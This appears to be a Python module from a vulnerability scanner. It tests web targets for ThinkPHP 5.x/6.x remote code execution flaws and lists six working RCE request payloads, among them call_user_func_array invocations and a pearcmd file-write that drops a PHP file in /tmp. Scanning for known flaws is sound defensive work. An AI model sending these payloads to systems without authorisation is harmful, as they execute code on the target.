from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("thinkphp_rce")


@register_scanner
class ThinkPHPRCEScanner(BaseScanner):
    name = "ThinkPHP RCE 系列漏洞"
    description = "ThinkPHP 5.x/6.x 远程代码执行漏洞集合"
    category = "thinkphp"
    module = "thinkphp_rce"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2018-20062", "CVE-2019-9082", "CVE-2022-46381"]
    references = [
        "https://github.com/vulhub/vulhub/tree/master/thinkphp",
    ]
    fix_suggestion = "升级ThinkPHP至最新版本，关闭调试模式，配置URL路由过滤"

    PAYLOADS = [
        {
            "name": "ThinkPHP 5.0.x RCE (invokefunction)",
            "path": "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=id&vars[1][]=",
            "method": "GET",
            "marker": "uid=",
            "risk_score": 10,
        },
        {
            "name": "ThinkPHP 5.0.x RCE (captcha)",
            "path": "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
            "method": "GET",
            "marker": "phpinfo()",
            "risk_score": 10,
        },
        {
            "name": "ThinkPHP 5.1.x RCE",
            "path": "/index.php?s=index/think\\request/input&filter[]=phpinfo&data=1",
            "method": "GET",
            "marker": "phpinfo()",
            "risk_score": 10,
        },
        {
            "name": "ThinkPHP 5.x Method RCE",
            "path": "/index.php?s=captcha",
            "method": "POST",
            "data": "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
            "marker": "phpinfo()",
            "risk_score": 10,
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        },
        {
            "name": "ThinkPHP 5.0.x 另一种invokefunction",
            "path": "/index.php?s=/index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
            "method": "GET",
            "marker": "phpinfo()",
            "risk_score": 10,
        },
        {
            "name": "ThinkPHP 多语言RCE (CVE-2022-46381)",
            "path": "/?lang=../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/hello.php",
            "method": "GET",
            "marker": "phpinfo()",
            "risk_score": 10,
        },
    ]

    DETECT_PATHS = [
        "/",
        "/index.php",
        "/index.php?s=/index/\\think\\app/invokefunction&function=phpinfo&vars[0]=-1",
    ]

    def _detect_thinkphp(self) -> bool:
        for path in ["/", "/index.php"]:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None:
                continue

            if "thinkphp" in resp.text.lower() or "ThinkPHP" in resp.text:
                return True
            if resp.headers.get("X-Powered-By", "").lower().startswith("thinkphp"):
                return True
            if "think" in resp.text.lower() and ("template" in resp.text.lower() or "exception" in resp.text.lower()):
                return True

        err_url = f"{self.target}/index.php?s=xxx"
        resp = http_request("GET", err_url)
        if resp and resp.status_code == 500 and "thinkphp" in resp.text.lower():
            return True

        return False

    def check(self) -> bool:
        is_thinkphp = self._detect_thinkphp()

        if not is_thinkphp:
            for payload in self.PAYLOADS[:1]:
                url = f"{self.target}{payload['path']}"
                resp = http_request(payload["method"], url)
                if resp and payload.get("marker", "") in resp.text:
                    is_thinkphp = True
                    break

        if not is_thinkphp:
            return False

        self.add_result(
            name="ThinkPHP 框架检测",
            risk_level="info",
            risk_score=0,
            target_url=self.target,
            detail="检测到ThinkPHP框架",
            evidence="响应中包含ThinkPHP特征标识",
        )

        found = False
        for payload in self.PAYLOADS:
            url = f"{self.target}{payload['path']}"
            headers = payload.get("headers", {})
            data = payload.get("data")

            resp = http_request(payload["method"], url, data=data, headers=headers)
            if resp is None:
                continue

            marker = payload.get("marker", "")
            if marker and marker in resp.text:
                self.add_result(
                    name=payload["name"],
                    risk_level="critical",
                    risk_score=payload["risk_score"],
                    target_url=url,
                    detail=f"ThinkPHP RCE漏洞确认: {payload['name']}",
                    payload=data or payload["path"],
                    response_snippet=resp.text[:500],
                    evidence=f"检测到特征标识: {marker}",
                )
                found = True

        return found
